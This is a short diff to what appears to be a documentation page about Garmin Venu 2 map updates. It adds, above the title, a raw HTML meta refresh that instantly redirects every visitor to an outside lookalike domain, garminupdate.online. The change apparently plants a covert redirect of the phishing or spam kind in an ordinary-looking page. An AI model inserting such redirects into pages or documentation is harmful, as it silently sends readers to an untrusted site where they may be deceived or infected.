@@ -1,3 +1,9 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
+
 Garmin Venu 2 Map Update: What You Need to Know About Navigation Features
 =====================================================
 
